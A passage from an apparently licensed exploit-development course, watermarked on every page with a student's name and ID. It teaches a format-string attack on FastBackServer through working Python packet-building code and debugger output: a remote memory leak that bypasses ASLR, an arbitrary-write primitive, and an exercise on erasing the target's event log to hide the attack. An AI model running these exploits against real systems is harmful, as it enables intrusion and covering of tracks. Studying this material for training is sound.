This proves that we can provide arbitrary null-free input that will be processed by vsnprintf. To 
trigger a read of its location, we must replace the appropriate “%x” specifier with a “%s”. 
Counting the number of formatted DWORDs in Listing 712, we find the 41414141 value in the 
21st position. 
We can now update our proof of concept. First, we’ll revert the changes in the initial stack leak 
packet. We can then make a copy, as shown in Listing 713, to be executed after the stack address 
is leaked back to us. 
# psAgentCommand 
buf = pack(">i", 0x400) 
buf += bytearray([0x41]*0xC) 
buf += pack("<i", 0x604)  # opcode 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x100)  # 1st memcpy: size field 
buf += pack("<i", 0x100)  # 2nd memcpy: offset 
buf += pack("<i", 0x100)  # 2nd memcpy: size field 
buf += pack("<i", 0x200)  # 3rd memcpy: offset 
buf += pack("<i", 0x100)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
     
# psCommandBuffer 
buf += b"w00t:BBAAAA" + b"%x:" * 20 
buf += b"%s" 
buf += b"%x" * 0x6b  
buf += b"B" * 0x100  
buf += b"C" * 0x100  
 
# Padding 
buf += bytearray([0x41]*(0x404-len(buf))) 
 
s.send(buf) 
Listing 713 - A %s specifier is inserted in the 20th position 
When the updated code is executed, the stack address will be leaked as normal, and then the new 
packet is processed. This will cause vsnprintf to interpret the four A’s, or 0x41414141, as a pointer 
to a character array. 
Since we have not provided a valid address yet, we can expect an access violation when the four 
A’s are being treated as an address. 
Listing 714 shows the result of executing the updated code. 
(2384.2490): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
564 
This exception may be expected and handled. 
eax=41414141 ebx=00000073 ecx=41414141 edx=7fffffff esi=7ffffffe edi=00000800 
eip=00672ead esp=0db7d964 ebp=0db7dbbc iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 
FastBackServer!_output+0x49a: 
00672ead 803800          cmp     byte ptr [eax],0           ds:0023:41414141=?? 
 
0:081> k 
 # ChildEBP RetAddr   
00 0db7dbbc 0066bf8e FastBackServer!_output+0x49a 
01 0db7dbf4 0065b14b FastBackServer!_vsnprintf+0x2c 
02 0db7dc0c 004803ff FastBackServer!ml_vsnprintf+0x18 
03 0db7dea4 0048056d FastBackServer!EventLog_wrapted+0x2e2 
04 0db7e2d4 0054b6a0 FastBackServer!EventLog+0x13c 
05 0db7e31c 0056df61 FastBackServer!AGI_S_GetAgentSignature+0xdd 
06 0dbdfe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x1aab 
07 0dbdfeb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130 
Listing 714 - vsnprintf tries to process 0x41414141 as a string pointer 
From the call stack, we find that an access violation indeed comes from the call to vsnprintf 
because of the invalid string pointer we provided. 
This provides us with confidence that this attack will indeed work. 
Next, we will replace the static A’s with the leaked stack address, adjusted for the offset. We must 
also read the leaked pointer to Kernelbase.dll from the event log and parse the data returned to 
us. 
Listing 715 shows the updated code. 
... 
targetAddr = stackAddr - 0x15c 
# psAgentCommand 
buf = pack(">i", 0x400) 
buf += bytearray([0x41]*0xC) 
buf += pack("<i", 0x604)  # opcode 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x100)  # 1st memcpy: size field 
buf += pack("<i", 0x100)  # 2nd memcpy: offset 
buf += pack("<i", 0x100)  # 2nd memcpy: size field 
buf += pack("<i", 0x200)  # 3rd memcpy: offset 
buf += pack("<i", 0x100)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
buf += b"w00t:BB" + pack("<i", targetAddr) + b"%x:" * 20 
buf += b"%s" 
buf += b"%x" * 0x6b  
buf += b"B" * 0x100  
buf += b"C" * 0x100  
 
# Padding 
buf += bytearray([0x41]*(0x404-len(buf))) 
 
s.send(buf) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
565 
 
responseSize = s.recv(4) 
size = int(responseSize.hex(),16) 
 
aSize = 0 
while True: 
    tmp = s.recv(size - aSize) 
    aSize += len(tmp) 
    if aSize == size: 
        break    
... 
Listing 715 - Using the target stack address with %s 
First, we’ll modify the code to use the leaked stack address after subtracting the offset for the 
return value. 
Next, we will add code to receive the response from the server. This is not data we need, but we 
must clear the receive buffer to subsequently read from the event log. 
Once both leak packets have been sent, the address into kernelbase.dll will be written to the event 
log and we can read it out. 
There is one issue we have to solve first. When we perform the stack leak and subsequent read, 
we’re relying on the enumerated optimal Start value. When we leak the kernelbase.dll pointer, 
another “w00t” header is written to the event log. 
If we perform a read, we would also read out the previous content and would have to filter out the 
first leak. The event log may also grow in the time between the two reads. 
We can address this issue by adding the amount of data we read from the event log when we 
found the stack address to the Start value. 
This will start the reading operation later in the event log, enabling us to avoid multiple leaked 
values at once. Using this method also prevents the event log from growing in such a way that 
our read primitive cannot obtain the new value. 
We can implement this solution quite easily by right-shifting the amount of data we have read by 
8 and adding that to the Start value. The implementation is shown in Listing 716. 
... 
print("The size read is: " + str(hex(aSize))) 
startValue += (aSize >> 8)  
 
data = eventData.split(b"w00t:") 
values = data[1].split(b":") 
... 
Listing 716 - Updating the Start value 
Note that this occurs right after we have read the data from the event log the first time. 
Finally, we need to parse the event log that was returned the second time. We can once again 
split on the “w00t:” header and subsequently split on the “:” delimiter. This time we must grab the 
21st entry, which has the index 20. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
566 
The updated code requires another packet to fetch the event log entry, as well as the code shown 
in Listing 717. 
print("The size read is: " + str(hex(aSize))) 
     
data = eventData.split(b"w00t:") 
values = data[1].split(b":") 
kbString = (values[20])[0:4] 
kernelbaseAddr = kbString[3] << 24 
kernelbaseAddr += kbString[2] << 16 
kernelbaseAddr += kbString[1] << 8 
kernelbaseAddr += kbString[0]  
 
print("Leaked Kernelbase address is: " + str(hex(kernelbaseAddr))) 
Listing 717 - Parsing the event log for kernelbase.dll address 
The 21st entry also happens to be the last included in the formatted string. This means when we 
perform the split, additional data will be included. Let’s avoid this by grabbing only the first four 
bytes into the kbString variable. 
To properly view the kernelbase.dll address, we’ll need to switch the endianness, which is 
implemented by a simple bit shift. Lastly, the located address is printed to the console. 
Our final step is to find the offset from the leaked kernelbase pointer to its base address. 
0:006> ? KERNELBASE!WaitForSingleObjectEx+0x13a - kernelbase 
Evaluate expression: 1098602 = 0010c36a 
Listing 718 - Offset from WaitForSingleObjectEx+0x13a to base address 
We can now subtract this static offset from the leaked kernelbase address to give us the module 
base address. When the updated exploit is executed, the leaked kernelbase address is printed. 
kali@kali:~$ python3 poc.py 192.168.120.10 
The optimal start value is: 0x61eea 
Stack address is written to event log 
The eventlog returned contains 3e03 bytes 
The size read is: 0x3e03 
Leaked stack address is: 0x1215ded4 
Kernelbase address leaked to event log 
The eventlog returned contains 2303 bytes 
The size read is: 0x2303 
Leaked Kernelbase address is: 0x745dc36a 
Kernelbase base address is: 0x744d0000 
Listing 719 - Leaking the base address of kernelbase.dll 
Our efforts have paid off! We have remotely obtained the base address of kernelbase.dll, which 
allows us to completely bypass ASLR. Excellent! 
Our work so far has enabled us to read from anywhere inside the process memory space we 
desire. The result of our work is commonly known as a read primitive. 
11.4.4.1 Exercises 
1. 
Go through the analysis performed in this section. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
567 
2. 
Put all the pieces of the exploit together and remotely obtain the base address of 
kernelbase.dll to bypass ASLR. 
11.4.4.2 Extra Mile 
Combine the ASLR bypass with one of the previously-exploited memory corruption vulnerabilities 
in FastBackServer to build a ROP chain and obtain remote code execution. 
11.4.4.3 Extra Mile 
When we use the format string function and the event log to read and write from memory, we 
generate a large amount of event log entries. In the spirit of stealth, it would be nice to clear the 
event log once our attack is complete. 
Earlier in the module, we found two cross references to the EventLOG_sSFILE global variable. The 
cross reference we used let us remotely read the event log. The other cross reference leads to a 
basic block containing a pointer to the string “Event Log Erased”. 
Perform the required reverse engineering to understand what this code branch does and how to 
trigger it. Finally, modify the proof of concept to delete contents from the event log after we have 
bypassed ASLR. 
11.5 Wrapping Up 
This module introduced the concept of a read primitive through a format string vulnerability. 
Through extensive reverse engineering and analysis, we have managed to build an exploit that 
remotely bypasses ASLR. 
A remote ASLR bypass can be combined with a memory corruption vulnerability, like a stack 
buffer overflow, to bypass Windows mitigations and obtain remote code execution. In the next 
module, we will return to the format string vulnerability and leverage it to create a write primitive 
as well. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
568 
 
12 Format String Specifier Attack Part II 
In the previous module, we performed extensive reverse engineering to find a way to leverage a 
format string vulnerability and develop a read primitive. Our read primitive was able to read 
memory contents at an arbitrary, null-free address. 
We used our read primitive to bypass ASLR, which can be used in combination with a memory 
corruption vulnerability to create an exploit bypassing both ASLR and DEP. 
In this module, we will explore ways to use the same format string vulnerability to gain code 
execution without needing an additional vulnerability. 
12.1 Write Primitive with Format Strings 
As with most complicated exploits, we need to go through several steps, so we’ll divide up the 
required work. We have already leaked the base address of kernelbase.dll through a read 
primitive. Next, let’s determine whether we might be able to create a write primitive, which we can 
use to modify content in memory. 
Many advanced exploits leverage both read and write primitives to bypass mitigations and obtain 
code execution. In the next few sections, we’ll create a write primitive, which we’ll use later in the 
module to overwrite EIP and achieve code execution. 
Depending on the application, there are various ways to create a read or write primitive. In our 
case, we’ll start by revisiting some aspects of format specifier theory. 
12.1.1 
Format String Specifiers Revisited 
We’ve been working with both hexadecimal and string format specifiers so far. In the module 
regarding Format String Specifier Attacks, we briefly explored other specifiers, such as decimal 
and floating point. 
These specifiers only let us read data or memory, but there’s a unique specifier for us to focus on 
called %n. 
Rather than formatting or helping to print text, this specifier writes the number of characters 
processed into a supplied address.390 Listing 720 shows an example of how the %n specifier can 
be used with printf. 
printf("This is a string %n", 0x41414141); 
Listing 720 - Example use of %n in printf 
When this code is executed, the hardcoded string is printed to the console and its length (0x11) is 
written to the address 0x41414141. If the provided address is not valid, an access violation is 
raised. 
Note that the length written does not include the format string specifier, but only the characters 
preceding it. 
 
390 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/printf/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
569 
Since this format specifier writes to memory, it poses a potential security risk, so compilers like 
Visual Studio have disabled it by default.391 
However, if a less secure compiler is used or %n has been enabled, we can attempt to leverage it 
to create a write primitive. 
Let’s find out if this is possible with FastBackServer. We can reuse our previous code to send a 
string format specifier, replacing it with %n. 
A standalone script for this check is given in Listing 721. 
import socket 
import sys 
from struct import pack 
 
def main(): 
    if len(sys.argv) != 2: 
        print("Usage: %s <ip_address>\n" % (sys.argv[0])) 
        sys.exit(1) 
     
    server = sys.argv[1] 
    port = 11460 
     
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect((server, port)) 
 
    # psAgentCommand 
    buf = pack(">i", 0x400) 
    buf += bytearray([0x41]*0xC) 
    buf += pack("<i", 0x604)  # opcode 
    buf += pack("<i", 0x0)    # 1st memcpy: offset 
    buf += pack("<i", 0x100)  # 1st memcpy: size field 
    buf += pack("<i", 0x100)  # 2nd memcpy: offset 
    buf += pack("<i", 0x100)  # 2nd memcpy: size field 
    buf += pack("<i", 0x200)  # 3rd memcpy: offset 
    buf += pack("<i", 0x100)  # 3rd memcpy: size field 
    buf += bytearray([0x41]*0x8) 
 
    # psCommandBuffer 
   buf += b"w00t:BBAAAA" + b"%x:" * 20 
    buf += b"%n" 
    buf += b"%x" * 0x6b  
    buf += b"B" * 0x100  
    buf += b"C" * 0x100  
 
    # Padding 
    buf += bytearray([0x41]*(0x404-len(buf))) 
 
    s.send(buf) 
    s.close() 
    sys.exit(0) 
 
391 (Microsoft, 2016), https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/set-printf-count-
output?redirectedfrom=MSDN&view=msvc-160 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
570 
 
if __name__ == "__main__": 
    main() 
Listing 721 - Script to trigger a write to 0x41414141 
The address we’ve attempted to write to is 0x41414141, and thus invalid. If the %n specifier is 
enabled, we would expect an access violation when it is invoked. 
Listing 722 shows the result in WinDbg when the packet is sent: 
(1d34.1354): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=41414141 ebx=0000006e ecx=000000c7 edx=00000200 esi=102edf4a edi=00000800 
eip=00672f1a esp=102ed964 ebp=102edbbc iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
FastBackServer!_output+0x507: 
00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=???????? 
Listing 722 - Access violation due to %n specifier 
We do indeed get an access violation, which means the %n specifier is enabled. 
We’ll observe that the access violation occurs because we attempt to write the contents of ECX 
to 0x41414141. This proves that if we replace 0x41414141 with a valid address, we can make the 
application write a value to it. 
This is a very important finding that we will leverage for code execution. We can already arbitrarily 
control the location being written to, but we must also control the value being written. We’ll 
explore this topic in the next section. 
12.1.1.1 Exercise 
1. 
Ensure you understand how the %n format specifier works and obtain an access violation by 
writing to an invalid memory address. 
12.1.2 
Overcoming Limitations 
The main goal in this section is to create a write primitive that can overwrite the contents at an 
arbitrary memory address with content of our choosing. 
During this process, we’ll encounter a number of limitations and restrictions on how the %n 
specifier allows us to write to memory. We will be required to think creatively to address each 
challenge, using the type of thought process needed for other advanced attacks, such as those 
used in browser exploits. 
Let’s use our knowledge from the reverse engineering we performed in the previous module to 
understand the value being written. We’ll start by examining the access violation triggered in the 
previous section, which is repeated in Listing 723. 
(1d34.1354): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=41414141 ebx=0000006e ecx=000000c7 edx=00000200 esi=102edf4a edi=00000800 
eip=00672f1a esp=102ed964 ebp=102edbbc iopl=0         nv up ei pl zr na pe nc 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
571 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
FastBackServer!_output+0x507: 
00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=???????? 
Listing 723 - Access violation due to %n specifier 
The %n specifier triggers a write of the number of bytes written so far. This value is 0xC7, as 
shown in the listing above. 
To understand the size being written we must take a look at the format string. We can start by 
revisiting the call to vnsprintf that triggers the vulnerability in IDA Pro: 
 
Figure 206: Call to vsnprintf 
Figure 206 shows that the format string is the third argument and will thus be located at an offset 
of 0xC bytes from the return address on the stack. 
Now we can dump the call stack and locate the return address as shown in Listing 724. 
0:079> k 
 # ChildEBP RetAddr   
00 102edbbc 0066bf8e FastBackServer!_output+0x507 
01 102edbf4 0065b14b FastBackServer!_vsnprintf+0x2c 
02 102edc0c 004803ff FastBackServer!ml_vsnprintf+0x18 
03 102edea4 0048056d FastBackServer!EventLog_wrapted+0x2e2 
04 102ee2d4 0054b6a0 FastBackServer!EventLog+0x13c 
05 102ee31c 0056df61 FastBackServer!AGI_S_GetAgentSignature+0xdd 
06 1034fe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x1aab 
07 1034feb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130 
08 1034fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116 
09 1034ff48 006693e9 FastBackServer!ORABR_Thread+0xef 
0a 1034ff80 75b99564 FastBackServer!_beginthreadex+0xf4 
0b 1034ff94 7798293c KERNEL32!BaseThreadInitThunk+0x24 
0c 1034ffdc 77982910 ntdll!__RtlUserThreadStart+0x2b 
0d 1034ffec 00000000 ntdll!_RtlUserThreadStart+0x1b 
 
0:079> dds 102edc0c L7 
102edc0c  102edea4 
102edc10  004803ff FastBackServer!EventLog_wrapted+0x2e2 
102edc14  102edca5 
102edc18  000001c7 
102edc1c  102eded4 
102edc20  102edeb8 
102edc24  102edc37 
Listing 724 - Callstack and return address for vsnprintf 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
572 
From 
the 
callstack 
we 
find 
the 
return 
address 
from 
vsnprintf 
must 
be 
FastBackServer!EventLog_wrapted+0x2e2, which means we can dump the stack contents of the 
stack frame from the subsequent call to get the arguments. 
At offset 0xC from the return address, we find the memory location for the format string. We can 
dump that next: 
0:079> da 102eded4 
102eded4  "AGI_S_GetAgentSignature: couldn'" 
102edef4  "t find agent w00t:BBAAAA%x:%x:%x" 
102edf14  ":%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%" 
102edf34  "x:%x:%x:%x:%x:%x:%x:%n%x%x%x%x%x" 
102edf54  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x" 
102edf74  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x" 
102edf94  "%x%x.." 
Listing 725 - Format string used with vnsprintf 
When the format string shown in Listing 725 is used with vsnprintf, the static string 
“AGI_S_GetAgentSignature: couldn’t find agent” is first processed. This is followed by our tag 
“w00t”, the alignment bytes, and a number of %x specifiers. 
Because the first part is a static string, we have no way of shortening that. Additionally we must 
keep the %n format specifier as the 21st specifier in order to keep it aligned with the placeholder 
address given by “AAAA”. 
As a result, the smallest possible value we can obtain in ECX is 0xC7. 
Let’s revisit the prototype for a format specifier to learn more about how this value can be 
increased.392 
%[flags][width][.precision][length]specifier 
Listing 726 - Format specifier prototype 
The subspecifier called [width] determines how many characters are written when a value is 
formatted. Essentially, this offers a way to pad the formatted result with empty spaces to make it 
appear more visually appealing. 
We can test this by modifying our script to split the 20th %x specifier from the rest. Let’s add the 
arbitrary decimal value 256 as the width. 
... 
# psCommandBuffer 
buf += b"w00t:BBAAAA" + b"%x:" * 19 
buf += b"%256x:" 
buf += b"%n" 
buf += b"%x" * 0x6b  
buf += b"B" * 0x100  
buf += b"C" * 0x100 
... 
Listing 727 - Added a 256 width to the 20th %x specifier 
 
392 (Microsoft, 2019), https://docs.microsoft.com/en-us/cpp/c-runtime-library/format-specification-syntax-printf-and-wprintf-
functions?view=msvc-160 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
573 
We’ll restart FastBackServer, attach WinDbg, and execute the modified code. This gives us the 
access violation shown in Listing 728. 
(274c.1b60): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=41414141 ebx=0000006e ecx=000001bf edx=00000200 esi=0d66df4d edi=00000800 
eip=00672f1a esp=0d66d964 ebp=0d66dbbc iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
FastBackServer!_output+0x507: 
00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=???????? 
Listing 728 - Access violation with specifier width 
Here, we’ll find that the value in ECX has been increased as expected, thus proving we can 
influence the value that is written. 
Note that ECX has been increased by 0xF8, not 0x100, because the original %x format specifier 
was an 8-character long DWORD. 
Ideally, we could write an arbitrary DWORD, but we have already found that we cannot write below 
the value 0xC7. We’ll also recall the function prototype of vsnprintf393, repeated in Listing 729. 
int vsnprintf( 
  char *s, 
  size_t n, 
  const char *format, 
  va_list arg 
); 
Listing 729 - Function prototype for vsnprintf 
The second argument is the maximum size of the formatted string, which means arbitrarily 
increasing the width of the %x specifier will likely cause it to be truncated. 
Let’s determine the maximum allowed value by revisiting the code segment that invokes the 
vsnprintf call inside EventLog_wrapted, as shown in Figure 207. 
 
393 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/vsnprintf/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
574 
 
Figure 207: Maximum size written to event log 
We’ll notice a hardcoded upper limit of 0x1F4 bytes is present, but a dynamic value is subtracted 
from this. We can determine this value if we restart FastBackServer, set a breakpoint at 
FastBackServer!AGI_S_GetAgentSignature+0xd8 and trigger it with the same proof of concept. 
Next, we set a breakpoint on FastBackServer!EventLog_wrapted+0x2c9, which is only triggered in 
the same thread context through the “~.” prefix. This allows us to reach the desired instruction in 
the correct thread context: 
0:001> bp FastBackServer!AGI_S_GetAgentSignature+0xd8 
 
0:001> g 
... 
 
0:001> ~. bp FastBackServer!EventLog_wrapted+0x2c9 
 
0:001> g 
... 
eax=0d52deb8 ebx=0607c4e0 ecx=0d52ded4 edx=7efeff08 esi=0607c4e0 edi=00669360 
eip=004803e6 esp=0d52dc1c ebp=0d52dea4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!EventLog_wrapted+0x2c9: 
004803e6 baf4010000      mov     edx,1F4h 
 
0:001> p 
eax=0d52deb8 ebx=0607c4e0 ecx=0d52ded4 edx=000001f4 esi=0607c4e0 edi=00669360 
eip=004803eb esp=0d52dc1c ebp=0d52dea4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!EventLog_wrapted+0x2ce: 
004803eb 2b55c8          sub     edx,dword ptr [ebp-38h] ss:0023:0d52de6c=0000002d 
 
0:001> p 
eax=0d52deb8 ebx=0607c4e0 ecx=0d52ded4 edx=000001c7 esi=0607c4e0 edi=00669360 
eip=004803ee esp=0d52dc1c ebp=0d52dea4 iopl=0         nv up ei pl nz ac po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
575 
FastBackServer!EventLog_wrapted+0x2d1: 
004803ee 52              push    edx 
Listing 730 - Maximum size of the formatted string 
In the calculation shown in Listing 730, the dynamic value 0x2D is subtracted from the static 
value 0x1F4, which results in a maximum size of the formatted string of 0x1C7 characters. 0x1C7 
bytes is far from our goal of being able to write an arbitrary DWORD, so we’ll need to find a 
creative solution. 
Let’s summarize our findings so far. We’re able to write a value between 0xC7 and 0x1C7 at an 
arbitrary null free address at this point. 
Although we cannot directly write an arbitrary DWORD value, we can trigger the vulnerability 
multiple times. This will allow us to combine four overwrites of one byte at increasing memory 
addresses to obtain a full DWORD. 
Before we go for a full DWORD, let’s learn more about how we can write an arbitrary byte in 
memory. By invoking the vulnerability, we can easily write the values between 0xC7 and 0xFF. If 
we write the value 0x100 and only examine the byte at the address we targeted, this is effectively 
0x00 since the leading value of 1 goes into the next byte. 
In this way, we can write the values from 0x100 to 0x1C6 to obtain an arbitrary byte value 
between 0x00 and 0xC6 in the targeted address, while ignoring the higher bytes. 
Let’s now expand on this, triggering the vulnerability four times to write four arbitrary bytes next to 
each other. Listing 731 shows this concept by writing the DWORD 0x1234ABCD into the address 
0x41414141. 
Write Address     Value     Result 
 
Initial state               00 00 00 00 
                            ----------- 
0x41414141        0xCD      00 00 00 CD 
                            ----------- 
0x41414142        0x1AB     00 01 AB CD 
                            ----------- 
0x41414143        0x134     01 34 AB CD 
                            ----------- 
0x41414144        0x112     12 34 AB CD 
Listing 731 - Write a byte 4 times gives a DWORD 
As illustrated in the listing above, we first write the value 0xCD to the address 0x41414141, then 
we write the value 0x1AB to the address 0x41414142. This leaves the previous value we wrote 
intact and the two lower bytes now contain 0xABCD, as desired. 
Following this process, we can write arbitrary content into all four bytes and obtain the DWORD 
0x1234ABCD in memory. The instruction used to write to memory is “mov dword ptr [eax],ecx”, 
which means a full DWORD is written. This has the side effect of also overwriting the three bytes 
above the desired address. 
In theory, we can follow this concept to develop a working write primitive. We’ll need to solve a 
number of implementation challenges, however. These challenges include: 
1. 
Determining width values for the %x specifier to write values between 0xC7 and 0x1C7. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
576 
2. 
Automatically calculating the width value in the script. 
3. 
Combining the stack leak and ability to write a byte. 
4. 
Combining four writes of a single byte into a DWORD. 
Let’s tackle these one at a time to build out the required code. 
We previously found that providing no width subspecifier results in the value 0xC7 being written, 
but if the width value is less than the maximum size vsnprintf processes, the output is not 
truncated. 
This means we need to determine the smallest width value that still results in 0xC7 being written. 
The value processed by the 20th %x format specifier is a DWORD read from the stack, which is 
interpreted as a hexadecimal value. This means it can only be between zero and eight characters 
long when written. 
To build a stable exploit, we’ll need to ensure that the size contained in the DWORD is fixed. 
Thinking back to when we developed the code required to leak a pointer from kernelbase.dll, we 
printed the formatted bytes as found in the event log. Our result is repeated in Listing 732. 
kali@kali:~$ python3 poc.py 192.168.120.10 
The optimal start value is: 0x61fe7 
Stack address leaked to event log 
The eventlog returned contains 1103 bytes 
The size read is: 0x1103 
[b'BBAAAAc4', b'1029ded4', b'3a', b'25', b'12e', b'78', b'0', b'5f494741', 
b'65475f53', b'65674174', b'6953746e', b'74616e67', b'3a657275', b'756f6320', 
b'276e646c', b'69662074', b'6120646e', b'746e6567', b'30307720', b'42423a74', 
b'41414141', b'2\n[May 14 10', b'58', b'05', b'032](1b60)->I4.FX_AGENT \t'  
... 
Leaked stack address is: 0x1029ded4 
Listing 732 - Output from appending A’s 
As highlighted in Listing 732, the value that was processed by the 20th %x format specifier is 
“b’42423a74”, which in ASCII translates to “t:BB”. These four characters are a substring of 
“w00t:BB” and is directly under our control. 
This means that the DWORD will always contain four characters, or when translated to 
hexidecimal, eight digits. Because of this, we can start the width value at eight every time without 
issues. 
Let’s use this information to write a byte value between 0xC7 and 0xFF, following the algorithm 
given in Listing 733. 
byteValue = <byte value> 
if byteValue > 0xC6: 
  width = byteValue - 0xC7 + 0x8 
Listing 733 - Algorithm to calculate width value 
For values between 0x00 and 0xC6, we’ll have to be a bit more clever. To write the byte value 
0x00, we need the total bytes written to be 0x100. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
577 
If we follow the algorithm in Listing 733 for a byteValue of 0xFF, the corresponding width is 0x40. 
This means that a width of 0x41 would only come from a byteValue of 0x100, which is equivalent 
to 0x00 in our case. 
Let’s set up a formula to solve this, as shown in Listing 734, where y is the static addition or 
subtraction we want to find. 
width = byteValue + 0x8 + y 
... 
0x41 = 0x0 + 0x8 + y <=> y = 0x39 
Listing 734 - Formula to calculate static offset 
Using the example values we found for a byteValue of 0x00 and related width of 0x41, we’ll find y 
to be 0x39. 
Now we can create the remaining portion of the algorithm, as shown in Listing 735. 
byteValue = <byte value> 
if byteValue > 0xC6: 
  width = byteValue - 0xC7 + 0x8 
else: 
  width = byteValue + 0x39 + 0x8 
Listing 735 - Algorithm to calculate width value in all cases 
Next, we can implement the completed algorithm in our Python script and use the dynamically-
calculated width value with the %x format specifier. 
The relevant updated code for attempting to write the value 0xD8 is shown in Listing 736. 
... 
byteValue = 0xD8 
 
if byteValue > 0xC6: 
  width = byteValue - 0xC7 + 0x8 
else: 
  width = byteValue + 0x39 + 0x8 
 
# psAgentCommand 
buf = pack(">i", 0x400) 
buf += bytearray([0x41]*0xC) 
buf += pack("<i", 0x604)  # opcode 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x100)  # 1st memcpy: size field 
buf += pack("<i", 0x100)  # 2nd memcpy: offset 
buf += pack("<i", 0x100)  # 2nd memcpy: size field 
buf += pack("<i", 0x200)  # 3rd memcpy: offset 
buf += pack("<i", 0x100)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
buf += b"w00t:BBAAAA" + b"%x:" * 19 
buf += b"%" + b"%d" % width + b"x:" 
buf += b"%n" 
buf += b"%x" * 0x6b  
buf += b"B" * 0x100  
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
578 
buf += b"C" * 0x100 
... 
Listing 736 - Updated code to write an arbitrary byte value in memory 
Let’s execute our updated proof of concept and send the packet to FastBackServer with WinDbg 
attached. 
We can now observe the access violation while writing to 0x41414141: 
(2310.b10): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=41414141 ebx=0000006e ecx=000000d8 edx=00000200 esi=0d78df4c edi=00000800 
eip=00672f1a esp=0d78d964 ebp=0d78dbbc iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
FastBackServer!_output+0x507: 
00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=???????? 
Listing 737 - Access violation while writing 0xD8 
